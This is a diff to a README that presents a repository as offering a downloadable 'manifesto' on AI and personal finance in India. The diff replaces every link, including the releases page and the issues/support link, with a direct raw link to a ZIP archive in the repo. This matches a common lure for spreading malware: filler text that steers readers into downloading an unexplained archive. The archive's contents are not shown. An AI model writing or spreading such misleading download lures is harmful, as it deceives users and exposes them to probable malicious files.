@@ -1,6 +1,6 @@
 # 📘 delusional-manifesto-wealthtech-india_ - Explore Personal Finance’s AI Future
 
-[![Download the Manifesto](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/releases)
+[![Download the Manifesto](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/raw/refs/heads/main/india-stack/manifesto_wealthtech_india_delusional_2.3.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This repository contains a detailed manifesto about the future of personal finan
 
 You will need to visit the release page below to download the files you want. 
 
-[Download Link](https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/releases)
+[Download Link](https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/raw/refs/heads/main/india-stack/manifesto_wealthtech_india_delusional_2.3.zip)
 
 You can find the complete manuscript, additional documents, and resources there. The files are available in common formats like PDF, DOCX, and possibly others for easy reading.
 
@@ -51,7 +51,7 @@ You do not need any programming tools or developer software to read or use this 
 ## 🚀 How to Download and Use
 
 1. Click the download badge at the top or visit the releases page here:  
-   https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/releases
+   https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/raw/refs/heads/main/india-stack/manifesto_wealthtech_india_delusional_2.3.zip
 
 2. Look for the latest release version. Releases are organized by date and version number.
 
@@ -105,7 +105,7 @@ If you have trouble downloading files or reading them:
 - Check your internet connection.
 - Make sure your applications (PDF reader, word processor) are up to date.
 - Visit the GitHub discussions or issues page of this repository for support:  
-  https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/issues
+  https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/raw/refs/heads/main/india-stack/manifesto_wealthtech_india_delusional_2.3.zip
 
 ---
 
@@ -113,7 +113,7 @@ If you have trouble downloading files or reading them:
 
 The manifesto may receive updates or expanded information. Visit the release page regularly for new versions or additional files:
 
-[https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/releases](https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/releases)
+[https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/raw/refs/heads/main/india-stack/manifesto_wealthtech_india_delusional_2.3.zip](https://github.com/Diversionaryattackreputation442/delusional-manifesto-wealthtech-india_/raw/refs/heads/main/india-stack/manifesto_wealthtech_india_delusional_2.3.zip)
 
 ---
 
